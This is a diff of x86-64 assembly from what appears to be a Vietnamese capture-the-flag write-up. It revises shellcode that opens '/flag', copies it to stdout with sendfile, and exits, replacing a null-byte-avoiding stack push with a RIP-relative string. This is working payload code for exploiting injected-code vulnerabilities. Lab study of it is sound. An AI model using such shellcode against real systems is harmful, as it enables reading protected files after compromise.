@@ -100,33 +100,31 @@ Kịch bản: `open("/flag", O_RDONLY)` -> `sendfile(STDOUT_FILENO, fd, 0, 1000)
 ```asm
 .intel_syntax noprefix
 
+.section .rodata
+flag_path:
+    .string "/flag"  # Trình biên dịch tự động thêm byte 0 ở cuối
+
+.section .text
 .global _start
+
 _start:
     # --- open("/flag", O_RDONLY) ---
-    # Syscall: open (rax=2), path (rdi), flags (rsi=0, O_RDONLY)
-    mov rax, 2
-    mov rbx, 0x67616c662f2f2f2f # "////flag" to avoid null bytes, can be cleaner
-    push rbx
-    mov rdi, rsp
-    xor rsi, rsi
+    mov rax, 2          # sys_open
+    lea rdi, [rip + flag_path] # Nạp địa chỉ của chuỗi "/flag" vào rdi
+    xor rsi, rsi        # rsi = 0 (O_RDONLY)
     syscall
 
-    # rax now holds the file descriptor (fd) of /flag
-
     # --- sendfile(1, fd, 0, 1000) ---
-    # Syscall: sendfile (rax=40), out_fd (rdi=1), in_fd (rsi=fd from open),
-    # offset (rdx=0), count (r10=1000)
-    mov rdi, 1
-    mov rsi, rax
-    xor rdx, rdx
-    mov r10, 1000
-    mov rax, 40
+    mov rdi, 1          # out_fd = 1 (stdout)
+    mov rsi, rax        # in_fd = fd từ sys_open
+    xor rdx, rdx        # offset = 0
+    mov r10, 1000       # count = 1000 bytes
+    mov rax, 40         # sys_sendfile
     syscall
 
     # --- exit(0) ---
-    # Syscall: exit (rax=60), error_code (rdi=0)
-    mov rax, 60
-    xor rdi, rdi
+    mov rax, 60         # sys_exit
+    xor rdi, rdi        # error_code = 0
     syscall
 ```
 
